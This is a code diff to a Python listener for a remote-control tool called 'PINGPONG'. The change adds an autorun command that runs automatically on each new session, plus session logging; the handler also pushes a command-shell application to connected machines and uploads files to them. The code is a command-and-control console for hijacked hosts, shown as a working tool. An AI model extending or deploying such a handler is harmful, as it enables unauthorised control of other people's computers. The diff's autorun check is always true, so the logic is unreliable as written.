@@ -10,6 +10,10 @@ import shutil
 import cmdshell
 import time
 def startserver(ip, port, printf):
+    if printf:
+        AUTORUNSCRIPT = input("handler>[*]Any AUTORUN COMMAND?(blank for no)>")
+    else:
+        AUTORUNSCRIPT = " "
     if port == "":
         port = 624
     if ip == "":
@@ -32,10 +36,14 @@ def startserver(ip, port, printf):
 
     while True:
         conn, addr = s.accept()
-        t = threading.Thread(target=PINGPONG_shell, args=(conn, addr, ip, port, True))
+        _ip = addr[0]
+        _port = addr[1]
+        if printf:
+            print('handler>[+]PINGPONG session Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
+        t = threading.Thread(target=PINGPONG_shell, args=(conn, addr, _ip, str(_port), True, AUTORUNSCRIPT))
         t.start()
 
-def PINGPONG_shell(conn, addr, ip, port, printf):
+def PINGPONG_shell(conn, addr, ip, port, printf, AUTOCOMMAND):
     def App_send(App, printf):
         if printf:
             print("PINGPONG>[*]Sending application......")
@@ -149,10 +157,18 @@ def PINGPONG_shell(conn, addr, ip, port, printf):
                 Upload(file_dir, to_dir)
             else:
                 return True
-    if printf:
-        print('handler>[+]Accept new connection from: ' + ip + ":" + str(port))
+    is_Auto = True
+    if AUTOCOMMAND != " " or AUTOCOMMAND != "":
+        is_Auto = False
+    else:
+        is_Auto = True
     while True:
-        command = input("PINGPONG>")
+        if is_Auto:
+            command = input("PINGPONG>")
+        else:
+            print("PINGPONG>[*]running " + AUTOCOMMAND)
+            command = AUTOCOMMAND
+            is_Auto = True
         if command == "cmd" or command == "CMD":
             if App_send("CMDSHELL_APP", True):
                 print("PINGPONG>[+]GOT IT")
